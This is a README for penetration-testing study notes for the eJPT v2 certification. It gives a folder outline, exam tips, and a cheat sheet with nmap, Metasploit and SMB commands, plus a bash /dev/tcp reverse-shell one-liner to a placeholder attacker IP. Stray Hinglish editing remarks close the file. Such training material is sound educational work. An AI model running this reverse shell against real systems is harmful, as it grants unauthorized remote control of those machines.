
<div align="center">

# INE eJPT v2 -> Complete Course Notes & Cheat Sheet

[![eJPT](https://img.shields.io/badge/eJPT-v2-FF6B6B?style=for-the-badge&logo=ine&logoColor=white)](https://ine.com/learning/paths/junior-penetration-tester-ejpt)
[![Status](https://img.shields.io/badge/Status-Active-4ECDC4?style=for-the-badge)]()
[![Kali](https://img.shields.io/badge/Kali_Linux-2026.1-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)](https://www.kali.org/)
[![Metasploit](https://img.shields.io/badge/Metasploit-Framework-2596CD?style=for-the-badge)](https://www.metasploit.com/)

</div>

> A hands-on, lab-tested study companion for the INE Junior Penetration Tester (eJPT v2) certification.

---

## Who Is This For?

| Profile | Why This Helps |
|---------|---------------|
| eJPT v2 Candidates | Structured notes aligned with the INE PTS course syllabus |
| Visual Learners | Prefer reading concise notes over hours of video content |
| Lab & Exam Users | Copy-paste ready commands for hands-on practice |
| Beginners in Pentesting | Explained like a peer, not a dry textbook |

---

## Repository Structure

```
eJPTv2-Notes/
|
├── 1. Assessment Methodologies/
│   ├── 1. Information Gathering/
│   ├── 2. Footprinting & Scanning/
│   ├── 3. Enumeration/                 # SMB, FTP, SSH, HTTP, SQL
│   ├── 4. Vulnerability Assessment/
│   └── 5. Auditing Fundamentals/
|
├── 2. Host & Network Penetration Testing/
│   ├── 1. System/Host-Based Attacks/
│   │   ├── Windows/                    # Exploits, PrivEsc, Credential Dumping
│   │   └── Linux/                      # Vulnerabilities, PrivEsc
│   ├── 2. Network-Based Attacks/       # Wireshark, ARP Poisoning, MITM
│   ├── 3. Metasploit Framework/        # Full MSF + Armitage
│   ├── 4. Exploitation/                # Shells, Exploits, AV Evasion
│   ├── 5. Post-Exploitation/           # PrivEsc, Persistence, Pivoting, Clearing Tracks
│   └── 6. Social Engineering/          # GoPhish Lab
|
└── 3. Web Application Penetration Testing/
    └── 1. Intro to Web & HTTP/         # Burp Suite, SQLMap, XSSer, Nikto, ZAP, Hydra
```

---

## Why These Notes?

> Most learners either watch videos passively and forget everything, or rely on scattered, outdated notes found online.

**These notes are different because they were written while doing the labs.**

- Copy-paste ready commands — tested in real environments
- Concept + Command — understand what it is and how to use it
- Exam-relevant highlights — no fluff, straight to what matters
- Peer-to-peer tone — explained clearly, not academically

---

## Quick Reference Cheat Sheet

### Nmap Scan
```bash
nmap -sV -sC -O -oN scan.txt <target-ip>
```

### Metasploit
```bash
msfconsole
search <exploit>
use <module>
set RHOSTS <target-ip>
set LHOST <your-ip>
exploit
```

### Reverse Shell
```bash
# Attacker
nc -lvnp 4444

# Victim
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
```

### SMB Enumeration
```bash
smbclient -L //<target-ip> -N
enum4linux -a <target-ip>
```

> Full topic-specific cheatsheets are inside each folder.

---

## Exam Strategy & Tips

| Tip | Details |
|-----|---------|
| Open Book | These notes are designed to be used during the exam |
| High-Yield Topics | Master Nmap, Metasploit, SMB/FTP/HTTP enumeration |
| Meterpreter | Know getsystem, hashdump, migrate, and background cold |
| Pivoting | Understand autoroute + socks_proxy for multi-network scenarios |
| Don't Overthink | If you completed the labs, you have the skills to pass |

---

## Tools Covered

Nmap | Metasploit | MSFvenom | Burp Suite | Wireshark | Netcat | Hydra | SQLMap | Gobuster | Enum4linux | Mimikatz | Bettercap | GoPhish | Nikto | SearchSploit | Aircrack-ng

---

## Getting Started

### 1. Clone the Repository
```bash
git clone https://github.com/iChetan7/eJPTv2-Notes.git
cd eJPTv2-Notes
```

### 2. Open in Obsidian (Recommended)
- Notes are interlinked with WikiLinks
- Use the graph view to explore connections between topics

### 3. Follow Along
- Use the folder structure to track your INE PTS course progress
- Keep cheatsheet files open during labs and the exam

---

## Disclaimer

> These notes are shared for educational and learning purposes only.
> Redistribution, republishing, or claiming ownership of this work is not permitted.

---

<div align="center">

**2026** | [@iChetan7](https://github.com/iChetan7) | Happy Hacking

</div>

- **Commands chhote aur simple** — sirf jo actually use hote hain
- **Python reverse shell hata diya** — bash wala hi enough hai
- **Hashtags (#) comments mein** — tree structure clean dikhe
- **Footer simple** — no fancy symbols

Ab copy-paste kar aur push kar de. Clean aur professional lagega. 🎯
